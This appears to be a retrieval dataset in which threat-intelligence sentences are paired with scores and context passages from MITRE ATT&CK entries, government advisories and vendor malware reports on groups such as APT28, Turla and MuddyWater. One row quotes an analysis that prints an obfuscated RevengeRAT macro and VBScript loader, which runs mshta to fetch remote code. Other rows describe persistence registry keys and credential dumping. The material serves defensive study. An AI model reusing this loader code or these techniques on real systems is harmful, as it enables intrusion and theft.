BRONZE BUTLER has given malware the same name as an existing file on the file share server to cause users to unwittingly launch and install the malware on additional systems.|0.7885133392916067|['Figure 13 shows the scheduled task that executes zrun.bat (a batch file) using the at command.Figure 13.', 'Scheduled task registration.', '(Source: Secureworks)Figure 14 shows the batch file (zrun.bat) executing, which adds a registry entry that auto-executes the malware.Figure 14.', 'Registry entry added to auto-execute malware.', '(Source: Secureworks)CTU researchers have also observed BRONZE BUTLER giving malware the same name as an existing document file on the file share server to cause users to unwittingly launch and install the malware on additional systems (see Figure 15).Figure 15.', 'Malware given the same name as an existing document file.', '(Source: Secureworks)ExfiltrationBRONZE BUTLER typically creates a list of files (i.e., a shopping list) from compromised hosts and file-share servers.', 'If the list is short, the group exfiltrates the files directly.', 'For large lists, the threat actors use the following procedure:Use malware to upload the large list of enumerated files to the C2 server.Select specific files to steal, creating a new list.Use downloaders or other malware to send the new list to a compromised host.Use archiving software to collect files in a password-protected archive.Use an uploader or other malware to send the archived files to an attacker-controlled server.', 'The uploader software is proprietary to this group, but Datper and xxmm also contain an uploading feature.', 'When exfiltration is complete, the uploader (or Datper or xxmm) immediately uses the del command to delete the RAR archives.Figure 16 shows BRONZE BUTLER extracting a new list of files and archiving a specific file into RAR format for exfiltration.Figure 16.']
A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.|0.7986572419586273|"['[3]EnterpriseT1105Ingress Tool TransferPatchworkpayloads download additional files from the C2 server.', '[8][3]EnterpriseT1559.002Inter-Process Communication:Dynamic Data ExchangePatchworkleveraged the DDE protocol to deliver their malware.', '[3]EnterpriseT1036.005Masquerading:Match Legitimate Name or LocationPatchworkinstalled its payload in the startup programs folder as ""Baidu Software Update.""', 'The group also adds its second stage payload to the startup programs as ""Net Monitor.', '""[1]They have also droppedQuasarRATbinaries as files named microsoft_network.exe and crome.exe.', '[4]EnterpriseT1112Modify RegistryAPatchworkpayload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.', '[3]EnterpriseT1027.001Obfuscated Files or Information:Binary PaddingPatchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[3].002Obfuscated Files or Information:Software PackingAPatchworkpayload was packed with UPX.', '[8].005Obfuscated Files or Information:Indicator Removal from ToolsPatchworkapparently alteredNDiskMonitorsamples by adding four bytes of random letters in a likely attempt to change the file hashes.', '[3].010Obfuscated Files or Information:Command ObfuscationPatchworkhas obfuscated a script with Crypto Obfuscator.', '[3]EnterpriseT1588.002Obtain Capabilities:ToolPatchworkhas obtained and used open-source tools such asQuasarRAT.']"
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|0.8453578968429508|"['This is the case with Ursnif.', 'It is being delivered in three stages: VBA macro [doc] ---> HTML [mshta]---> DLL [regsvr32] (Stage 1) (Stage 2) (Stage 3) Why mshta?', ""One of the reasons malware authors try to switch to new delivery methods is to bypass security defenses, leave fewer footprints, and blend with existing system noise on the victim's machine."", 'This seems to be the reason for using mshta in this new campaigndespite using PowerShell as the second-stage payload in the past.', 'A brief description of mshta Mshta.exe is a utility that executes Microsoft HTML Applications (HTAs).', 'HTAs are stand-alone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.', 'Adversaries can use mshta.exe to proxy execution of malicious .hta files and JavaScript or VBScript through a trusted Windows utility.', 'Mshta.exe can be used to bypass application whitelisting solutions, which do not account for its potential use, and digital certificate validation.', ""Since mshta.exe executes outside of Internet Explorer's security context, it also bypasses browser security settings."", ""Doc file analysis [First stage] As mentioned earlier, the malware's initial payload was being delivered via document files with the name info_03_24.doc during the time of our analysis."", 'The document didnt contain any exploits but used macro code to drop the second-stage payload.']"
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|0.9152354628197026|['This is because proxy execution of malicious .hta files Mshta will execute HTA content in files with any extension (or none at all) as long and Javascript or VBScript through as the file extension is not mapped to a text/plain MIME type (e.g., Mshta will not a trusted Windows utility.', 'There are execute a file with a .txt extension).', 'To further disguise Mshta execution, TA551 several examples of different types of renamed the binary in attempts to evade detection logic, which relied on Mshta threats leveraging mshta.exe during executing with its expected filename of mshta.exe.', 'initial compromise and for execution of code.', 'Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.', 'Detection HTAs are standalone applications that execute using the same models and Collection requirements technologies of Internet Explorer, but outside of the browser.', 'Process and command-line monitoring Monitoring process execution and command-line parameters will offer defenders visibility into many behaviors associated with malicious abuse of Mshta.', 'Similarly, process lineage is also helpful for detecting adversary use of Mshta.', 'At a minimum, collect parent-child process relationships, and, if possible, consider collecting information about grandparent relationships too.', 'Process metadata We observed multiple adversaries this year renaming the Mshta binary to evade brittle detection logic.', 'While we cover this extensively in our analysis of T1036.003: Rename System Utilities, binary metadata like internal process names are an effective data source to determine the true identity of a given process.']
HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.|1.0|"['The following info-graphics summarize the infection chain dissected in the sections below, starting from the weaponized Office document, initially delivered through malicious emails, to the final RevengeRAT payload.Figure 1.', 'RG campaign infection chainThe Macro DropperHash7c0a69f93831dcd550999b765c7922392dd0d994b0241071545749e865cc9854ThreatDropperBrief DescriptionXLS Macro dropperSsdeep768:kCSk3hOdsylKlgxopeiBNhZFGzE+ cL2kdAJ7evT8RsFbQ:kDk3hOdsylKlgxopeiBNhZFGzE+cL2ktTable 1: Information about the RevengeRAT malicious macro dropperAll the infection starts with a malicious XLS document weaponized with an embedded macro.', 'The VB code is polluted by a multitude of junk instructions and after a cleaning phase we isolated the essence of the malicious code.Public Function Workbook_Open() \trgh1 = YUcIFcEAA(""tzo{h\'o{{wA66ip"", ""7"") \trgh2 = YUcIFcEAA(""{5s6"", ""7"") \trgh3 = YUcIFcEAA(""7O^7ixXmxmxm"", ""5"") \trgh = rgh1 + rgh2 + rgh3 \tShell rgh End Function Public Function YUcIFcEAA(Sg1NdPNeR As String, jxvMDn0vV As Integer)  Dim PFc88so50 As Integer  For PFc88so50 = 1 To Len(Sg1NdPNeR)  Mid(Sg1NdPNeR, PFc88so50, 1) = Chr(Asc(Mid(Sg1NdPNeR, PFc88so50, 1)) - jxvMDn0vV)  Next PFc88so50  YUcIFcEAA = Sg1NdPNeR End FunctionCode Snippet 1: real core of the macroFigure 2: Command used to start the infectionA quick and dirty manipulation of the script enabled us to easily bypass the code obfuscation techniques protecting the next stage of the infection: the invocation of a Microsoft HTML Application hosted in a remote location.The macro has the only purpose to run the mshta command.', 'As defined by theMitre, Mshta.exe is a utility that executes Microsoft HTML Applications (HTA).', 'HTA files have the file extension .hta.', 'HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.', '.The Hidden HTAThe malware retrieves the HTA application to run from a remote host behind the Bitly shortening service.', 'The target page is the rg.html, downloaded from https[://createdbymewithdeniss[ .blogspot[.com/p/rg[.html.', 'Even in this case, like in the Roma255 campaign, the attacker abused the Blogger platform to hide the malicious code in plain sight.Figure 3: Fake Blogspot pageThe page does not embed any binaries or malicious links, but navigating its source code, it reveals packed HTML code dynamically injected into the page during the rendering.Figure 4: Malicious code contained in the malicious blogspot siteThis additional piece of script is specifically designed to be executed by the mshta utility.', 'It is a VBScript code creating a WScript.Shell object, a particular object decisely not designed to be loaded into regular web browsers engines.<script language=""VBScript""> Set Xkasdj2 = CreateObject(StrReverse(StrReverse(""WScript.Shell""))) Xa_aw1 = StrReverse(StrReverse(""h"")) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(StrReverse(""p"")) + StrReverse("":"") + StrReverse(StrReverse(StrReverse(StrReverse(""/""))) + StrReverse(StrReverse(StrReverse(StrReverse(""/""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse(StrReverse(StrReverse(""w""))) + StrReverse(StrReverse("".""))', '+ StrReverse(StrReverse(""p"")) + StrReverse(StrReverse(""a"")) + StrReverse(StrReverse(""s"")) + StrReverse(StrReverse(StrReverse(StrReverse(""t""))) + StrReverse(""e"") + StrReverse(""b"") + StrReverse(""i"") + StrReverse(""n"") + StrReverse(StrReverse("".""))']"
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.|0.8347732635976163|"['Compile After T1027.004 MuddyWater has used the .NET csc.exe tool to compile executables from Delivery downloaded C# code.', 'Masquerading: T1036.005 MuddyWater has disguised malicious executables and used filenames and Registry Match Legitimate key names associated with Windows Defender.', 'E.g., Small Sieve uses variations of Name or Location Microsoft (Microsift) and Outlook in its filenames to attempt to avoid detection during casual inspection.', 'Deobfuscate/Decode T1140 MuddyWater decoded Base64-encoded PowerShell commands using a VBS file.', 'Files or Information Signed Binary Proxy T1218.003 MuddyWater has used CMSTP.exe and a malicious .INF file to execute its Execution: CMSTP POWERSTATS payload.', 'Signed Binary Proxy T1218.005 MuddyWater has used mshta.exe to execute its POWERSTATS payload and to Execution: Mshta pass a PowerShell one-liner for execution.', 'Signed Binary Proxy T1218.011 MuddyWater has used malware that leveraged rundll32.exe in a Registry Run Execution: Rundll32 key to execute a .dll .', 'Execution Guardrails T1480 The Small Sieve payload used by MuddyWater will only execute correctly if the word Platypus is passed to it on the command line.', ""Impair Defenses: T1562.001 MuddyWater can disable the system's local proxy settings."", 'Disable or Modify Tools 5/12Technique Title ID Use Credential Access OS Credential T1003.001 MuddyWater has performed credential dumping with Mimikatz and Dumping: LSASS procdump64.exe .', 'Memory OS Credential T1003.004 MuddyWater has performed credential dumping with LaZagne.']"
Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.|0.8130295502520429|"['The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].', '[29] In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments [T1482].', ""[30]IDNameDescriptionT1083File and Directory DiscoveryAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.T1482Domain Trust DiscoveryAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.Collection [TA0009]Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives.""]"
APT28 has used the ntdsutil.exe utility to export the Active Directory database for credential access.|0.7517524102771034|['[38][36][11][18][17]EnterpriseT1588.002Obtain Capabilities:ToolAPT28has obtained and used open-source tools likeKoadic,Mimikatz, andResponder.', '[11][22][39]EnterpriseT1137.002Office Application Startup:Office TestAPT28has used the Office Test persistence mechanism within Microsoft Office by adding the Registry keyHKCU\\\Software\\\Microsoft\\\Office test\\\Special\\\Perfto execute code.', '[43]EnterpriseT1003OS Credential DumpingAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3][14].001LSASS MemoryAPT28regularly deploys both publicly available (ex:Mimikatz) and custom password retrieval tools on victims.', '[44][3]They have also dumped the LSASS process memory using the MiniDump function.', '[2].003NTDSAPT28has used the ntdsutil.exe utility to export the Active Directory database for credential access.', '[2]EnterpriseT1120Peripheral Device DiscoveryAPT28uses a module to receive a notification every time a USB mass storage device is inserted into a victim.', '[33]EnterpriseT1566.001Phishing:Spearphishing AttachmentAPT28sent spearphishing emails containing malicious Microsoft Office and RAR attachments.', '[36][10][11][3][22][17][21][16].002Phishing:Spearphishing LinkAPT28sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.', '[3][13][14][16]EnterpriseT1598Phishing for InformationAPT28has used spearphishing to compromise credentials.', '[31][16].003Spearphishing LinkAPT28has conducted credential phishing campaigns with embedded links to attacker-controlled domains.']
Turla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.|0.826845427946801|"['[11]EnterpriseT1615Group Policy DiscoveryTurlasurveys a system upon check-in to discover Group Policy details using thegpresultcommand.', '[14]EnterpriseT1562.001Impair Defenses:Disable or Modify ToolsTurlahas used a AMSI bypass, which patches the in-memory amsi.dll, in PowerShell scripts to bypass Windows antimalware products.', '[11]EnterpriseT1105Ingress Tool TransferTurlahas used shellcode to download Meterpreter after compromising a victim.', '[16]EnterpriseT1570Lateral Tool TransferTurlaRPC backdoors can be used to transfer files to/from victim machines on the local network.', '[11][18]EnterpriseT1112Modify RegistryTurlahas modify Registry values to store payloads.', '[11][18]EnterpriseT1106Native APITurlaand its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.', '[11]EnterpriseT1027.005Obfuscated Files or Information:Indicator Removal from ToolsBased on comparison ofGazerversions,Turlamade an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.', ""[2].010Obfuscated Files or Information:Command ObfuscationTurlahas used encryption (including salted 3DES viaPowerSploit'sOut-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads."", '[11].011Obfuscated Files or Information:Fileless StorageTurlahas used the Registry to store encrypted and encoded payloads.', '[11][18]EnterpriseT1588.001Obtain Capabilities:MalwareTurlahas used malware obtained after compromising other threat actors, such asOilRig.', '[20][21].002Obtain Capabilities:ToolTurlahas obtained and customized publicly-available tools likeMimikatz.']"
Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.|0.9201661825794446|"['Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.', 'Adversaries may execute their own malicious payloads by Dynamic Linker Hijacking T1547.006 hijacking environment variables the dynamic linker uses to load shared libraries.']"
It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.|0.8262620688053434|"['The second file (keyword_parm.txt) is a list of keywords that is read into keywordVec.', 'https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html 1/511/1/2019 MESSAGETAP: Whos Reading Your Text Messages?', '| FireEye Inc Both files are deleted from disk once the configuration files are read and loaded into memory.', 'After loading the keyword and phone data files, MESSAGETAP begins monitoring all network connections to and from the server.', 'It uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers.', 'It continues parsing protocol layers including SCTP, SCCP, and TCAP.', 'Finally, the malware parses and extracts SMS message data from the network traffic: 1.', 'SMS message contents 2.', 'The IMSI number 3.', 'The source and destination phone numbers The malware searches the SMS message contents for keywords from the keywordVec list, compares the IMSI number with numbers from the imsiMap list, and checks the extracted phone numbers with the numbers in the phoneMap list.', 'Figure 1: General Overview Diagram of MESSAGETAP If the SMS message text contains one of the keywordVec values, the contents are XORed and saved to a path with the following format: /etc/<redacted>/kw_<year><month><day>.csv https://www.fireeye.com/blog/threat-research/2019/10/messagetap-who-is-reading-your-text-messages.html 2/511/1/2019 MESSAGETAP: Whos Reading Your Text Messages?']"
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.|0.883776066058274|"['Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.', 'Adversaries may establish persistence and elevate privileges by Installer Packages T1546.016 using an installer to trigger the execution of malicious content.']"
Adversaries may encode data with a non-standard data encoding system to make the content of command and control traffic more difficult to detect.|0.835411725477968|"['Adversaries may use an OSI non-application layer protocol for Non-Application Layer T1095 communication between host and C2 server or among infected Protocol hosts within a network.', 'Adversaries may create multiple stages for command and control Multi-Stage Channels T1104 that are employed under different conditions or for certain functions.', 'Adversaries may interact with the native OS application Native API T1106 programming interface (API) to execute behaviors.', 'Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove Modify Registry T1112 information as part of cleaning up, or as part of other techniques to aid in persistence and execution.', 'Once established within a system or network, an adversary may Automated Collection T1119 use automated techniques for collecting internal data.', 'Adversaries may encode data to make the content of command Data Encoding T1132 and control traffic more difficult to detect.', 'Adversaries may encode data with a non-standard data encoding Non-Standard Encoding T1132.002 system to make the content of command and control traffic more difficult to detect.', 'Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to Network Share Discovery T1135 gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement.', 'Deobfuscate/Decode Files Adversaries may use Obfuscated Files or Information to hide T1140 or Information artifacts of an intrusion from analysis.', 'Exploit Public-Facing Adversaries may attempt to exploit a weakness in an Internet- T1190 Application facing host or system to initially access a network.', 'Page 45 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to gather information on domain trust Domain Trust Discovery T1482 relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.']"
Silence has used port 444 when sending data about the system from the client to the server.|0.7527033205118696|['Thus, the application under investigation can be used to collect other data, save the data (as an argument of the command line when launched) into the registry, and then send it.', 'A new registry key is created called Types Supported.', 'It is not used anywhere further: HKLM\\\SYSTEM\\\CurrentControlSet\\\Services\\\Eventlog\\\Application\\\ Microsoft Audit Service\\\TypesSupported = 7 The file under investigation tries to connect to the 185.29.10[.', ']117:443 network node The program features two ports: 443 and 444.', 'The first one, 443, is a remote port, which should be tapped to connect with C2.', 'The second one, 444, is used only once when sending data about the system from the client to the server.', 'Stated in the file but not used ports for possible connections: 3389 and 8081 The connection is established at the layer of TCP sockets (Http and Https protocols are not used) If the connection is not established, the attempts to connect and send files will be repeated every 42 seconds or 1 minute (in two different threads).', 'After successful connection, the server gets information about the system: a string with 16 random characters, PC name, user name, system right (user SID), country\\\locale, local IP, number of the second port embedded into the build.', 'The length of the statistics package is always 208 bytes.', '56 The file performs 3 different requests to the server.', 'If the responses are not equal to zero, it makes 4 more requests in a row (4th,5th,6th,7th requests).']
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.|0.7755573088501492|['The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[23]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Privilege Escalation[TA0004]Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network.', 'The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].', '[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].']
Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.|0.9345827860299124|"['Technique Title ID Use Network Connection Adversaries may perform network connection enumeration to T0840 Enumeration discover information about device communication patterns.', 'Adversaries may obfuscate command and control traffic to make Data Obfuscation T1001 it more difficult to detect.', 'Adversaries may impersonate legitimate protocols or web service Protocol Impersonation T1001.003 traffic to disguise command and control activity and thwart analysis efforts.', 'Page 43 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may attempt to dump credentials to obtain account OS Credential Dumping T1003 login and credential material, normally in the form of a hash or a clear text password, from the operating system and software.', 'Adversaries may use rootkits to hide the presence of programs, Rootkit T1014 files, network connections, services, drivers, and other system components.', 'Adversaries may attempt to make an executable or file difficult to Obfuscated Files or T1027 discover or analyze by encrypting, encoding, or otherwise Information obfuscating its contents on the system or in transit.', 'Adversaries may perform software packing or virtual machine Software Packing T1027.002 software protection to conceal their code.', 'Adversaries may attempt to manipulate features of their artifacts Masquerading T1036 to make them appear legitimate or benign to users and/or security tools.', 'Adversaries may sniff network traffic to capture information about Network Sniffing T1040 an environment, including authentication material passed over the network.', 'Adversaries may attempt to get a listing of services running on Network Service Discovery T1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.', 'Adversaries may inject dynamic-link libraries (DLLs) into Dynamic-link Library T1055.001 processes in order to evade process-based defenses as well as Injection possibly elevate privileges.']"
Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.|0.7760152000729671|"['[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.', '[25]IDNameDescriptionT1078Valid AccountsAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.T1078.004Valid Accounts: Cloud AccountsAdversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.Defense Evasion[TA0005]Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.', 'The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].', '[26]IDNameDescriptionT1027Obfuscated Files or InformationAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit.Credential Access[TA0006]Credential Access consists of techniques for stealing credentials like account names and passwords.', 'The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].', '[27]The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].', '[28]IDNameDescriptionT1003.003OS Credential Dumping: NTDSAdversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights.T1110.003Brute Force: Password SprayingAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials.Discovery consists of techniques an adversary may use to gain knowledge about the system and internal network.', 'The adversary enumerated files and directories or searched in specific locations of a host or network share for certain information within a file system [T1083].', '[29] In addition, the adversary attempted to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain or forest environments [T1482].', ""[30]IDNameDescriptionT1083File and Directory DiscoveryAdversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system.T1482Domain Trust DiscoveryAdversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments.Collection [TA0009]Collection consists of both the techniques adversaries may use to gather information and the sources that information is collected from that are relevant to the adversary's objectives."", 'The adversary leverages information repositories, such as SharePoint, to mine valuable information [T1213.002].']"
APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.|0.7550892552856845|['[21]EnterpriseT1037.001Boot or Logon Initialization Scripts:Logon Script (Windows)AnAPT28loader Trojan adds the Registry keyHKCU\\\Environment\\\UserInitMprLogonScriptto establish persistence.', '[30]EnterpriseT1110Brute ForceAPT28can perform brute force attacks to obtain credentials.', '[29][21][31].001Password GuessingAPT28has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days.', '[24]APT28has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks.', '[2].003Password SprayingAPT28has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks.', '[24][31]APT28has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks.', '[2]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellAPT28downloads and executes PowerShell scripts and performs PowerShell commands.', '[11][21][2].003Command and Scripting Interpreter:Windows Command ShellAnAPT28loader Trojan uses a cmd.exe and batch script to run its payload.', '[30]The group has also used macros to execute payloads.', '[18][32][17][21]EnterpriseT1092Communication Through Removable MediaAPT28uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.', '[33]EnterpriseT1586.002Compromise Accounts:Email AccountsAPT28has used compromised email accounts to send credential phishing emails.']
It has also used PowerShell to execute commands and move laterally through a victim network.|1.0002|"['[6]EnterpriseT1560.001Archive Collected Data:Archive via UtilityWizard Spiderhas archived data into ZIP files on compromised machines.', '[7]EnterpriseT1197BITS JobsWizard Spiderhas used batch scripts that utilizes WMIC to execute aBITSAdmintransfer of a ransomware payload to each compromised machine.', '[7]EnterpriseT1547.001Boot or Logon Autostart Execution:Registry Run Keys / Startup FolderWizard Spiderhas established persistence via the Registry keyHKCU\\\SOFTWARE\\\Microsoft\\\Windows\\\CurrentVersion\\\Runand a shortcut within the startup folder.', '[2][4].004Boot or Logon Autostart Execution:Winlogon Helper DLLWizard Spiderhas established persistence using Userinit by adding the Registry key HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\Winlogon.', ""[4]EnterpriseT1059.001Command and Scripting Interpreter:PowerShellWizard Spiderhas used macros to execute PowerShell scripts to download malware on victim's machines."", '[6]It has also used PowerShell to execute commands and move laterally through a victim network.', ""[2][4][12][7].003Command and Scripting Interpreter:Windows Command ShellWizard Spiderhas usedcmd.exeto execute commands on a victim's machine."", 